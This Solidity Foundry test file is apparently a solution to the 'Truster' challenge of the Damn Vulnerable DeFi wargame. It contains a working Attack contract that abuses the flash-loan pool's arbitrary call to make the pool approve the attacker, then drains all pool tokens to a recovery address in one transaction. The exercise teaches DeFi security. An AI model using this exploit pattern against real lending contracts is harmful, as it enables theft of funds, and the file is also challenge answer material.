// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attack {
    constructor(
        TrusterLenderPool pool,
        DamnValuableToken token,
        address recovery
    ) {
        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, amount);
    }
}
contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);
        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    function test_truster() public checkSolvedByPlayer {
        new Attack(pool, token, recovery);
        assertEq(token.balanceOf(recovery), 1_000_000e18);
        console.log(
            "token balance of recovery after drain:  ",
            token.balanceOf(recovery) / 1 ether
        );
    }

    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}
